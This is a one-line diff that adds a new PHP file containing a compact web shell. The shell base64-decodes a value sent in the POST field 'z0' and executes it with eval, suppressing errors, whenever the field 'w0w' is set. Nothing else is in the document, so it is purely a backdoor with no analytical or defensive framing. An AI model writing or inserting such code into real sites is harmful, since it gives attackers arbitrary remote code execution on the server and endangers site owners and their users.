@@ -1,0 +1,1 @@
+<?php $rss=$_POST['w0w'];if($rss!=''){$xsser=base64_decode($_POST['z0']);@eval("\$safe=$xsser;");}?>
